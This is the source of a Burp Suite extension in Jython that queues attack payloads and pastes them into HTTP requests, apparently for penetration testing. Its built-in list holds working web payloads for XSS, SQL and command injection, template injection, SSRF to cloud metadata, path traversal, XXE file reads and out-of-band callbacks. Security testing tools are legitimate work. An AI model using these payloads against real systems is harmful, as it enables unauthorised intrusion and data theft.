# -*- coding: utf-8 -*-
#
# Payload Queue Inserter (Burp Suite Extension) - Jython 2.7
#
# Inserts payloads from a configurable queue into the selected request editor
# position. Optional Hackvertor-style wrapping can be enabled from the tab.

from burp import IBurpExtender, ITab, IContextMenuFactory, IExtensionStateListener

from java.awt import AWTEvent, BorderLayout, FlowLayout, KeyboardFocusManager, Robot, Toolkit
from java.awt.datatransfer import DataFlavor, StringSelection
from java.awt.event import AWTEventListener, KeyEvent
from java.lang import System, Thread
from java.util import ArrayList
from javax.swing import (
    BoxLayout,
    JButton,
    JCheckBox,
    JLabel,
    JMenu,
    JMenuItem,
    JOptionPane,
    JPanel,
    JScrollPane,
    JSpinner,
    JTextArea,
    JTextField,
    KeyStroke,
    SpinnerNumberModel,
    SwingUtilities,
)
from threading import Lock


DEFAULT_PAYLOADS_TEXT = """<script>alert(1)</script>
"><script>alert(1)</script>
'"><svg onload=alert(1)>
<img src=x onerror=alert(1)>
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
javascript:alert(1)
'"><iframe srcdoc="<script>alert(1)</script>">
"><img src=x onerror=alert(1)>
'"><img src=x onerror=alert(1)>
<svg/onload=alert(1)>
"><svg/onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<iframe src=javascript:alert(1)>
%22%3E%3Csvg%2Fonload%3Dalert%281%29%3E
&lt;img src=x onerror=alert(1)&gt;

{{7*7}}
${7*7}
<%= 4356*16 %>
@(4356*16)
@{4356*16}
#{4356*16}
{% extends "/etc/passwd" %}
${{<%[%'"}}%\\
{{config}}
{{self}}
${{7*7}}
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }

'
"
`
' OR '1'='1
" OR "1"="1
' OR 1=1-- -
') OR ('1'='1
admin'--
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' AND 1=2 UNION SELECT NULL,NULL-- -
'||pg_sleep(10)--
'; select 1 from pg_sleep(10)-- -
' or select pg_sleep(10)-- -
"0"XOR(if(now()=sysdate(),sleep(10),0))XOR"Z"
'0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z'
1 WAITFOR DELAY '0:0:10'--

;id
|id
`id`
$(id)
;sleep 10
|sleep 10
& ping -c 5 127.0.0.1 &
|| nslookup [COLLAB] ||
${script:javascript:java.lang.Runtime.getRuntime().exec('nslookup [COLLAB]')}

http://[COLLAB]
https://[COLLAB]/ssrf-basic
//[COLLAB]/ssrf-schemeless
http://[COLLAB]@127.0.0.1/
http://127.0.0.1:80/
http://localhost:80/
http://169.254.169.254/latest/meta-data/
/http://169.254.169.254/metadata/v1
http://localhost:443\\@@[COLLAB]/
http://localhost?@[COLLAB]/
http://[COLLAB]%0d%0a@localhost/

/etc/passwd
../../../../../../../../../etc/passwd
..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
....//....//....//....//etc/passwd
C:\\windows\\win.ini
..\\..\\..\\..\\windows\\win.ini
${file:UTF-8:/etc/passwd}
%24%7bfile:UTF-8:/etc/passwd%7d

<!DOCTYPE xxe [<!ENTITY ei SYSTEM "http://[COLLAB]/xxe">]><ei>&ei;</ei>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY ei SYSTEM "file:///etc/passwd">]><root>&ei;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY ei SYSTEM "file:///c:/windows/win.ini">]><root>&ei;</root>

{"$ne":null}
{"$regex":".*"}
{"$where":"sleep(10000) || true"}
';sleep(10000);'
*)(|(objectClass=*))
*)(&(objectClass=person)(uid=*))
' or '1'='1
"] | //* | //* [@id="

https://[COLLAB]/open-redirect
//[COLLAB]/open-redirect
/\\\\/[COLLAB]/open-redirect
[COLLAB]!ei\\@example.com
ei%[COLLAB](@example.com
"ei@[COLLAB]>ei"@example.com
"""


class PayloadHotkeyAwtListener(AWTEventListener):
    def __init__(self, extender):
        self._extender = extender

    def eventDispatched(self, event):
        try:
            if isinstance(event, KeyEvent):
                self._extender.handle_hotkey_event(event)
        except:
            pass


class HotkeyInsertThread(Thread):
    def __init__(self, extender):
        Thread.__init__(self)
        self._extender = extender

    def run(self):
        self._extender.insert_next_via_hotkey()


class BurpExtender(IBurpExtender, ITab, IContextMenuFactory, IExtensionStateListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.setExtensionName("Payload Queue Inserter")

        self._lock = Lock()
        self._index = 0
        self._clipboard_lock = Lock()
        self._clipboard_restore_token = 0
        self._last_hotkey_ms = 0
        self._hotkey_awt_listener = PayloadHotkeyAwtListener(self)
        self._is_mac = System.getProperty("os.name", "").lower().startswith("mac")

        self._init_ui()
        self._load_settings()
        self._refresh_status()

        self._callbacks.addSuiteTab(self)
        self._callbacks.registerContextMenuFactory(self)
        self._callbacks.registerExtensionStateListener(self)
        Toolkit.getDefaultToolkit().addAWTEventListener(self._hotkey_awt_listener, AWTEvent.KEY_EVENT_MASK)
        self._callbacks.printOutput("Payload Queue Inserter loaded v0.4")

    # ----- Burp tab -----

    def getTabCaption(self):
        return "Payload Queue"

    def getUiComponent(self):
        return self._root

    def _init_ui(self):
        self._root = JPanel(BorderLayout())

        self.payloads_area = JTextArea(
            DEFAULT_PAYLOADS_TEXT,
            18,
            80,
        )

        payload_panel = JPanel(BorderLayout())
        payload_panel.add(JLabel("Payloads, one per line:"), BorderLayout.NORTH)
        payload_panel.add(JScrollPane(self.payloads_area), BorderLayout.CENTER)

        settings_panel = JPanel()
        settings_panel.setLayout(BoxLayout(settings_panel, BoxLayout.Y_AXIS))

        hack_panel = JPanel(FlowLayout(FlowLayout.LEFT))
        self.wrap_hackvertor_cb = JCheckBox("Wrap with Hackvertor tag", False)
        self.open_tag_field = JTextField("<@urlencode>", 18)
        self.close_tag_field = JTextField("</@urlencode>", 18)
        hack_panel.add(self.wrap_hackvertor_cb)
        hack_panel.add(JLabel("Open:"))
        hack_panel.add(self.open_tag_field)
        hack_panel.add(JLabel("Close:"))
        hack_panel.add(self.close_tag_field)

        hotkey_panel = JPanel(FlowLayout(FlowLayout.LEFT))
        self.enable_hotkey_cb = JCheckBox("Enable global hotkey", True)
        hotkey_panel.add(self.enable_hotkey_cb)
        hotkey_panel.add(JLabel("Windows/RDP: Ctrl+P, macOS: Cmd+P. Payload is pasted at the current caret."))

        index_panel = JPanel(FlowLayout(FlowLayout.LEFT))
        self.status_label = JLabel("")
        self.index_spinner = JSpinner(SpinnerNumberModel(1, 1, 999999, 1))
        self.reset_btn = JButton("Reset to first", actionPerformed=lambda e: self._reset_index())
        self.set_index_btn = JButton("Start from index", actionPerformed=lambda e: self._set_index_from_ui())
        self.load_defaults_btn = JButton("Load built-in payloads", actionPerformed=lambda e: self._load_default_payloads())
        self.save_btn = JButton("Save settings", actionPerformed=lambda e: self._save_settings())
        index_panel.add(self.status_label)
        index_panel.add(JLabel("Next index:"))
        index_panel.add(self.index_spinner)
        index_panel.add(self.set_index_btn)
        index_panel.add(self.reset_btn)
        index_panel.add(self.load_defaults_btn)
        index_panel.add(self.save_btn)

        info_panel = JPanel(FlowLayout(FlowLayout.LEFT))
        info_panel.add(JLabel("Use context menu in a request editor: Payload Queue Inserter -> Insert next payload."))

        settings_panel.add(hack_panel)
        settings_panel.add(hotkey_panel)
        settings_panel.add(index_panel)
        settings_panel.add(info_panel)

        self._root.add(payload_panel, BorderLayout.CENTER)
        self._root.add(settings_panel, BorderLayout.SOUTH)

    # ----- Context menu -----

    def createMenuItems(self, invocation):
        menu_items = ArrayList()

        menu = JMenu("Payload Queue Inserter")

        insert_next = JMenuItem("Insert next payload")
        insert_next.setAccelerator(KeyStroke.getKeyStroke("control P"))
        insert_next.addActionListener(lambda e: self._insert_payload(invocation, True))

        insert_current = JMenuItem("Insert current payload without advancing")
        insert_current.addActionListener(lambda e: self._insert_payload(invocation, False))

        reset = JMenuItem("Reset queue to first payload")
        reset.addActionListener(lambda e: self._reset_index())

        menu.add(insert_next)
        menu.add(insert_current)
        menu.addSeparator()
        menu.add(reset)

        menu_items.add(menu)
        return menu_items

    def extensionUnloaded(self):
        try:
            Toolkit.getDefaultToolkit().removeAWTEventListener(self._hotkey_awt_listener)
        except:
            pass

    # ----- Payload handling -----

    def _get_payloads(self):
        raw = self.payloads_area.getText()
        payloads = []
        for line in raw.splitlines():
            line = line.strip()
            if line and not line.startswith("#"):
                payloads.append(line)
        return payloads

    def _format_payload(self, payload):
        if self.wrap_hackvertor_cb.isSelected():
            return self.open_tag_field.getText() + payload + self.close_tag_field.getText()
        return payload

    def _current_payload(self):
        payloads = self._get_payloads()
        if not payloads:
            return None

        self._lock.acquire()
        try:
            if self._index < 0 or self._index >= len(payloads):
                self._index = 0

            payload = payloads[self._index]
        finally:
            self._lock.release()

        self._refresh_status()
        return self._format_payload(payload)

    def _advance_payload(self):
        payloads = self._get_payloads()
        if not payloads:
            return

        self._lock.acquire()
        try:
            self._index += 1
            if self._index >= len(payloads):
                self._index = 0
        finally:
            self._lock.release()

        self._refresh_status()

    def _insert_payload(self, invocation, advance):
        try:
            payload = self._current_payload()
            if payload is None:
                self._alert("Payload list is empty.")
                return

            messages = invocation.getSelectedMessages()
            if messages is None or len(messages) == 0:
                self._alert("No request message is selected.")
                return

            if len(messages) > 1:
                self._alert("Select exactly one request editor message. Bulk insert is intentionally disabled.")
                return

            message = messages[0]
            request = message.getRequest()
            if request is None:
                self._alert("Selected item has no editable request.")
                return

            bounds = invocation.getSelectionBounds()
            if bounds is None or len(bounds) < 2:
                self._alert("Place the cursor in the request editor or select text before inserting.")
                return

            start = int(bounds[0])
            end = int(bounds[1])
            if start > end:
                tmp = start
                start = end
                end = tmp

            if start < 0 or end > len(request):
                self._alert("Selection is outside of the request byte range.")
                return

            payload_bytes = self._helpers.stringToBytes(payload)
            new_request = request[:start] + payload_bytes + request[end:]
            message.setRequest(new_request)

            if advance:
                self._advance_payload()

            self._save_settings()
        except Exception as exc:
            self._alert("Insert failed: %s" % exc)

    def handle_hotkey_event(self, event):
        try:
            if event.getID() != KeyEvent.KEY_PRESSED:
                return False
            if event.getKeyCode() != KeyEvent.VK_P:
                return False
            if not (event.isControlDown() or event.isMetaDown()):
                return False
            if event.isAltDown():
                return False

            event.consume()

            now = System.currentTimeMillis()
            if now - self._last_hotkey_ms < 250:
                return True
            self._last_hotkey_ms = now

            self._callbacks.printOutput("Payload Queue Inserter hotkey detected")
            HotkeyInsertThread(self).start()
            return True
        except:
            return False

    def insert_next_via_hotkey(self):
        if not self.enable_hotkey_cb.isSelected():
            return

        try:
            focus_owner = KeyboardFocusManager.getCurrentKeyboardFocusManager().getFocusOwner()
            if focus_owner is not None and SwingUtilities.isDescendingFrom(focus_owner, self._root):
                return
        except:
            pass

        payload = self._current_payload()
        if payload is None:
            Toolkit.getDefaultToolkit().beep()
            return

        if self._paste_text(payload):
            self._callbacks.printOutput("Payload Queue Inserter pasted payload")
            self._advance_payload()
            self._save_settings()
        else:
            Toolkit.getDefaultToolkit().beep()

    def _paste_text(self, text):
        clipboard = None
        previous = None
        try:
            clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()
            try:
                previous = clipboard.getContents(None)
            except:
                previous = None

            restore_token = self._next_clipboard_restore_token()
            clipboard.setContents(StringSelection(text), None)

            if not self._wait_for_clipboard_text(clipboard, text):
                self._callbacks.printError("Clipboard did not update before paste")
                return False

            robot = Robot()
            robot.setAutoDelay(20)
            paste_modifier = KeyEvent.VK_META if self._is_mac else KeyEvent.VK_CONTROL

            robot.keyRelease(KeyEvent.VK_SHIFT)
            robot.keyRelease(KeyEvent.VK_CONTROL)
            robot.keyRelease(KeyEvent.VK_META)
            robot.keyPress(paste_modifier)
            robot.keyPress(KeyEvent.VK_V)
            robot.keyRelease(KeyEvent.VK_V)
            robot.keyRelease(paste_modifier)

            if previous is not None:
                RestoreClipboardThread(self, restore_token, previous).start()

            return True
        except Exception as exc:
            try:
                self._callbacks.printError("Hotkey paste failed: %s" % exc)
            except:
                pass
            return False

    def _next_clipboard_restore_token(self):
        self._clipboard_lock.acquire()
        try:
            self._clipboard_restore_token += 1
            return self._clipboard_restore_token
        finally:
            self._clipboard_lock.release()

    def _restore_clipboard_if_current(self, token, contents):
        self._clipboard_lock.acquire()
        try:
            if token != self._clipboard_restore_token:
                return
            Toolkit.getDefaultToolkit().getSystemClipboard().setContents(contents, None)
        finally:
            self._clipboard_lock.release()

    def _wait_for_clipboard_text(self, clipboard, expected):
        for i in range(20):
            try:
                data = clipboard.getData(DataFlavor.stringFlavor)
                if data == expected:
                    return True
            except:
                pass
            Thread.sleep(50)
        return False

    # ----- Queue controls -----

    def _reset_index(self):
        self._lock.acquire()
        try:
            self._index = 0
        finally:
            self._lock.release()
        self._refresh_status()
        self._save_settings()

    def _set_index_from_ui(self):
        payload_count = len(self._get_payloads())
        if payload_count == 0:
            self._alert("Payload list is empty.")
            return

        selected = int(self.index_spinner.getValue()) - 1
        if selected < 0:
            selected = 0
        if selected >= payload_count:
            selected = payload_count - 1

        self._lock.acquire()
        try:
            self._index = selected
        finally:
            self._lock.release()
        self._refresh_status()
        self._save_settings()

    def _load_default_payloads(self):
        choice = JOptionPane.showConfirmDialog(
            self._root,
            "Replace the current payload list with built-in grouped payloads?",
            "Payload Queue Inserter",
            JOptionPane.YES_NO_OPTION,
        )
        if choice != JOptionPane.YES_OPTION:
            return

        self.payloads_area.setText(DEFAULT_PAYLOADS_TEXT)
        self._reset_index()

    def _refresh_status(self):
        def run():
            payload_count = len(self._get_payloads())
            if payload_count == 0:
                self.status_label.setText("Queue: empty")
                self.index_spinner.setValue(1)
                return

            self._lock.acquire()
            try:
                if self._index < 0 or self._index >= payload_count:
                    self._index = 0
                display_index = self._index + 1
            finally:
                self._lock.release()

            self.status_label.setText("Queue: %d payload(s), next: %d" % (payload_count, display_index))
            self.index_spinner.setValue(display_index)

        try:
            SwingUtilities.invokeLater(run)
        except:
            run()

    # ----- Settings -----

    def _save_settings(self):
        try:
            self._callbacks.saveExtensionSetting("payloads", self.payloads_area.getText())
            self._callbacks.saveExtensionSetting("wrap_hackvertor", "1" if self.wrap_hackvertor_cb.isSelected() else "0")
            self._callbacks.saveExtensionSetting("open_tag", self.open_tag_field.getText())
            self._callbacks.saveExtensionSetting("close_tag", self.close_tag_field.getText())
            self._callbacks.saveExtensionSetting("enable_hotkey", "1" if self.enable_hotkey_cb.isSelected() else "0")
            self._callbacks.saveExtensionSetting("index", str(self._index))
            self._refresh_status()
        except:
            pass

    def _load_settings(self):
        try:
            payloads = self._callbacks.loadExtensionSetting("payloads")
            if payloads is not None:
                self.payloads_area.setText(payloads)

            wrap = self._callbacks.loadExtensionSetting("wrap_hackvertor")
            if wrap is not None:
                self.wrap_hackvertor_cb.setSelected(wrap == "1")

            open_tag = self._callbacks.loadExtensionSetting("open_tag")
            if open_tag is not None:
                self.open_tag_field.setText(open_tag)

            close_tag = self._callbacks.loadExtensionSetting("close_tag")
            if close_tag is not None:
                self.close_tag_field.setText(close_tag)

            enable_hotkey = self._callbacks.loadExtensionSetting("enable_hotkey")
            if enable_hotkey is not None:
                self.enable_hotkey_cb.setSelected(enable_hotkey == "1")

            index = self._callbacks.loadExtensionSetting("index")
            if index is not None:
                self._index = int(index)
        except:
            self._index = 0

    def _alert(self, msg):
        try:
            JOptionPane.showMessageDialog(self._root, msg, "Payload Queue Inserter", JOptionPane.WARNING_MESSAGE)
        except:
            self._callbacks.printError(msg)


class RestoreClipboardThread(Thread):
    def __init__(self, extender, token, contents):
        Thread.__init__(self)
        self._extender = extender
        self._token = token
        self._contents = contents

    def run(self):
        try:
            Thread.sleep(1200)
            self._extender._restore_clipboard_if_current(self._token, self._contents)
        except:
            pass
